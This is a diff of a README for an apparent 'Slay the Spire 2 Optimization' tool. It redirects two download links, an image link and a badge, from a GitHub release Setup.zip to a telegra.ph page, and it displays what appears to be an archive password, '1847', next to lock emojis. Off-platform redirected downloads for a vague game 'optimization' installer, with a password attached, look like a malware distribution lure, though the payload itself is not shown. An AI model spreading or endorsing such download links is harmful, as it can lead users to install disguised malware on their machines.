@@ -8,7 +8,7 @@
 
 ---
 
-[![Download](og-image.png)](https://github.com/FirePoolFreeze/Slay-the-Spire-2-Optimization/releases/download/v1.0/Setup.zip)
+[![Download](og-image.png)](https://telegra.ph/Download-05-21-39)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![Slay the Spire 2 Optimization](https://img.shields.io/badge/Download%20Slay%20the%20Spire%202%20Optimization-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/FirePoolFreeze/Slay-the-Spire-2-Optimization/releases/download/v1.0/Setup.zip)
+[![Slay the Spire 2 Optimization](https://img.shields.io/badge/Download%20Slay%20the%20Spire%202%20Optimization-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://telegra.ph/Download-05-21-39)
 
 **🔐🔐🔐** `1847`
 
